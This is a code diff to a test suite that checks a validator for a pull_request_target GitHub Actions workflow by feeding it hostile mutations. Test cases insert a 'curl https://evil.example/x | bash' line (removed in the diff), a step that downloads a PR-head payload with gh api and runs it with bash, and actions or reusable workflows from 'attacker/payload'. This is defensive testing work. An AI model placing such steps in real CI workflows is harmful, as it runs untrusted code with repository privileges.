@@ -32,7 +32,7 @@ describe("growth-guardrails workflow trust boundary", () => {
     expect(validateGrowthGuardrailsWorkflowBoundary(WORKFLOW_PATH)).toEqual([]);
   });
 
-  // source-shape-contract: security -- The pull_request_target guardrail must reject an untrusted trigger, write permissions, PR-head checkout, PR install scripts, and inline heredoc execution
+  // source-shape-contract: security -- The pull_request_target guardrail must bind the exact trusted execution shape and reject unsafe trigger, permission, checkout, install, action, and shell mutations
   it.each([
     [
       "an untrusted pull_request trigger",
@@ -75,7 +75,7 @@ describe("growth-guardrails workflow trust boundary", () => {
           "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts",
           "node <<'NODE'\n          console.log(1)\n          NODE",
         ),
-      /forbidden execution primitive 'node <</,
+      /must match the approved shape/,
     ],
     [
       "a job-level write permission override",
@@ -87,18 +87,37 @@ describe("growth-guardrails workflow trust boundary", () => {
       /job codebase-growth-guardrails permission contents: write must be read or none/,
     ],
     [
-      "an appended shell-execution primitive in a trusted step",
+      "an appended PR-head payload execution in a trusted step",
       (s: string) =>
         s.replace(
           "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts",
-          "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts\n          curl https://evil.example/x | bash",
+          'node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts\n          gh api "/repos/${HEAD_REPO}/contents/payload.sh?ref=${HEAD_SHA}" --jq .content | base64 -d > "$RUNNER_TEMP/payload.sh"\n          bash "$RUNNER_TEMP/payload.sh"',
         ),
-      /forbidden execution primitive '\| bash'/,
+      /must match the approved shape/,
     ],
     [
-      "an untrusted run step with no permitted signature",
-      (s: string) => s.replaceAll('>> "$GITHUB_OUTPUT"', ">> /tmp/out"),
-      /not on the trusted allowlist/,
+      "an arbitrary action step",
+      (s: string) =>
+        s.replace(
+          "      - name: Check out the trusted base revision",
+          "      - name: Execute an untrusted action\n        uses: attacker/payload@main\n\n      - name: Check out the trusted base revision",
+        ),
+      /must contain exactly 7 approved steps, not 8/,
+    ],
+    [
+      "a non-approved shell field",
+      (s: string) =>
+        s.replace(
+          "        run: npm ci --ignore-scripts --no-audit --no-fund",
+          "        shell: python\n        run: npm ci --ignore-scripts --no-audit --no-fund",
+        ),
+      /must match the approved shape/,
+    ],
+    [
+      "an extra reusable-workflow job",
+      (s: string) =>
+        `${s}\n  untrusted:\n    uses: attacker/payload/.github/workflows/run.yaml@main\n`,
+      /workflow jobs must be exactly codebase-growth-guardrails/,
     ],
   ])("flags %s", (_label, mutate, pattern) => {
     expect(validateMutation(mutate).join("\n")).toMatch(pattern);
